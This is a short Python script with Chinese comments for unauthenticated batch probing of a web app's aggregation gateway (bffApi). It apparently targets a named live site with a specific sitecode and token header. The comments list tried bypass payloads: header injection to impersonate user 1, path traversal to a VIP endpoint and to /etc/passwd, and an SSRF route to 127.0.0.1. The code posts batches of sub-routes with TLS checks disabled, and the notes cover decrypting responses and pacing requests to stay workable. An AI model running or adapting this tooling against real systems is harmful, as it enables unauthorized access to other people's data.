#!/usr/bin/env python3
# BFF 聚合器未授权批量投递 + 匿名基线判定
# 适用：SPA + 服务端聚合网关（bffApi），请求体 data[] 可塞任意子路由
#
# 一、投递协议（qt0008 实测格式，其他站点按抓包调整字段名）
#   {"scene":"homeFirstLoad","requestId":"<uuid>","header":null,
#    "data":[{"id":"sub-1","route":"/api/xxx","params":{...},"header":null}, ...],
#    "time":<unix>}
#
# 二、判定纪律（这条比 payload 值钱）
#   匿名 code:1 + data 非空  !=  未授权
#   必须回答：这条数据，一个未登录的陌生人是否本来就不该看到？
#   区分三类：
#     A 公开配置（活动/费率/i18n/站点信息）  -> 不是漏洞
#     B 匿名被分配的访客账号自己的数据        -> 看是否为全局共享（才是洞）
#     C 他人/全站数据                        -> 未授权，高危
#
# 三、qt0008 上已确认失效的四种绕过（不要再试）
#   1) 子请求 header 注入：header={"uid":"1","useridx":"1","token":""} -> code:0
#   2) 路由穿越：/api/../api/member/user/vip -> code:0
#   3) 绝对 URL / SSRF：route="http://127.0.0.1:80/" -> code:0
#   4) 文件穿越：/api/../../etc/passwd -> code:0
#   说明：route 必须是 / 开头且命中已注册路由；子请求 header 不被后端采信。
#
# 四、批量投递骨架
import json, time, uuid, requests, urllib3
urllib3.disable_warnings()

BASE = "https://TARGET_API_DOMAIN"          # 例如 https://www.qitian7.com
HDRS = {                                    # 缺一会 41000 "Failed to obtain server"
    "Content-Type": "application/json",     # 明文即可（加密非强制）
    "sitecode": "1169", "token": "<staticToken>",
    "domain": "<前端域名>", "Origin": "https://<前端域名>",
}

def bff(routes):
    body = {"scene": "homeFirstLoad", "requestId": str(uuid.uuid4()), "header": None,
            "data": [{"id": f"sub-{i}", "route": r, "params": {}, "header": None}
                     for i, r in enumerate(routes)],
            "time": int(time.time())}
    r = requests.post(f"{BASE}/hall/api/gohal/bffApi", headers=HDRS,
                      json=body, timeout=30, verify=False)
    return r  # 响应若是密文，用已知 key 解密；明文模式有时直接返回 json

# 五、分批纪律：每批 8-10 条、批间隔 >=2s，失败时才能定位是哪条
# 六、只读纪律：add/update/delete/save/submit/claim/withdraw/transfer 命名路由不投递
